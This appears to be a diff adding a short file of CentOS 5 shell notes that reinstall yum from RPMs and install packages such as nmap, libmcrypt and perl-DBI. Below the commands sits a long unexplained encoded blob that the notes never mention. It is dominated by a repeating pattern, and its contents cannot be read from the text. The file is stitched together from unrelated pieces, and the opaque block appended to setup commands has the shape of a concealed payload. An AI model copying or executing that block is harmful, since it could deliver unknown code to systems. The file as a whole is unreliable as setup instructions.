@@ -1,0 +1,50 @@
+rpm -qa | grep yum
+rpm -e xxx xxx xxx
+
+
+rpm -ivh yum-3.2.22-20.el5.centos.noarch.rpm \
+         yum-metadata-parser-1.1.2-3.el5.centos.i386.rpm \
+         yum-fastestmirror-1.1.16-13.el5.centos.noarch.rpm \
+         epel-release-5-3.noarch.rpm
+
+rpm --import RPM-GPG-KEY-CentOS-5
+
+
+mv /var/cache/yum /var/cache/yum.bak
+
+
+yum list
+
+
+yum install nmap libmcrypt libgomp perl-DBI unixODBC libc-client libtool-ltdl
+
+
+NW0sBDVmA34mN36oMTBtNWFsLDE4BG6lMaBpBaJnBGBkF4csD5QBE5NkD55+D5d+D5d+D5dHDDde
+6U1+EGMYHEdPD5d+Fo4pMbQP+FUWMDcrHSIdJFMPD5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D54jWJdHBEUeOrUc+VQWFDAHNagmJFMA6WAlNWQKFq6mOpIE+FUm
+IGUY6FBmGWEbN311NG5P/rNmGp1IMHwp8VET/EVrLF1fN2xVEDJjFpVpWJdX6EEbOp1HApQ17Tcr
+EVFmOrUsA5Rm+nRqFoEiPpIkNHhV+nQKDUUiMpIs/FQVMnEHMDx+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D4lB6qlKNpd+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJd+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+
+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+D5d+WJckNWZk
+NWZkNXsm
